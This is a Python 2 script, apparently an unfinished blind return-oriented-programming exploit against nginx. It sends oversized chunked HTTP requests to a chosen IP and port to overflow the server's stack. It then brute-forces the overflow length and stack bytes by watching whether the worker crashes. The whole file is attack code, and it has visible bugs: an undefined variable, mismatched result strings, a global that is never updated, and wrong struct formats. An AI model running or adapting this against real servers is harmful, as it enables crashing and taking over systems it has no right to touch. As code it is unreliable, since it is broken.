import sys
import socket
import argparse
from time import sleep
import struct

overflow_len = 0

class Nginx:
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port

	def exploit(self,data):
		s = None
		while s == None:
			s = self.get_sock()
		d = "A" * 4080
		d += data
		s.sendall(d)

		alive = self.check_alive(s)

		if not alive:
			return "CRASH"
		req = ("0\r\n"
        		"\r\n"
        		"GET / HTTP/1.1\r\n"
        		"Host: bla.com\r\n"
        		"Transfer-Encoding: Chunked\r\n"
        		"Connection: Keep-Alive\r\n"
        		"\r\n")

		s.sendall(req)

		alive = self.check_alive(s)
		s.close()
		if not alive:
			return "NO CRASH"
		return "INFINITE LOOP"

	def check_alive(self,socket):
		socket.setblocking(False)
		for i in range(100):
			try:
				x = socket.recv(1)
			except:
				return False
			if len(x) == 0:
				return False
			sleep(0.01)
		socket.setblocking(True)
		return True
	def get_sock(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.ip,self.port))
		size = 200
		req = ("GET / HTTP/1.1\r\n"
				"Host: bla.com\r\n"
				"Transfer-Encoding: Chunked\r\n"
				"Connection: Keep-Alive\r\n"
				"\r\n")
		req += str(size) +"\r\n"
		s.send(req)
		resp = s.recv(4096)

		if resp == None:
			print "No response from server"
			sys.exit(0)
		headers = resp.split('\r\n')

		if "200 OK" not in headers[0]:
			print "Bad request to server:"
			print headers[0]
			sys.exit(0)

		resp_len = 0
		for h in headers:
			if "Content-Length: " in h:
				resp_len = int(h.split()[1])
		if resp_len > 4096:
			s.recv(resp_len)
		return s

def find_overflow_len(target):
	inc = 8
	overflow_len = inc
	while True:
		payload = "A" * overflow_len
		resp = target.exploit(payload)
		if resp == "CRASH":
			break
		overflow_len += inc

	if overflow_len == inc:
		print "Unreliable"
		sys.exit(0)

	overflow_len -= inc

	while True:
		payload = "A" * overflow_len
		resp = target.exploit(payload)
		if resp == "CRASH":
			break
		overflow_len+=1

	overflow_len-=1
	print "Found overflow length - it is: " + str(overflow_len) + " bytes!"

def find_rip(target):
	words = []
	while True:
		payload = "A" * overflow_len
		for word in words:
			payload +=  struct.pack("<I",word)

		w = stack_read_word(payload,target)
		print "FOUND A WORD!"
		break
def stack_read_word(payload,target):
	word = ""

	for i in range(8):
		w = stack_read_byte(payload,target)
		if not w:
			return None
		word += w
		payload += w
	return struct.unpack("<I", word)

def stack_read_byte(payload,target):
	for i in range(256):
		print i
		s = payload
		s += struct.pack("c",i)
		r = nginx.exploit(s)
		if r == "NOCRASH":
			return i
	return None

def brop():
	parser = argparse.ArgumentParser(description='Attempts to create an exploit given only a method to crash a remote service.')
	parser.add_argument('-ip', help='ip address of target system')
	parser.add_argument('-p', type=int, help='port target service is running on')
	args = parser.parse_args()
	nginx = Nginx(args.ip,args.p)
	find_overflow_len(nginx)
	find_rip(nginx)
if __name__ == '__main__':
	brop()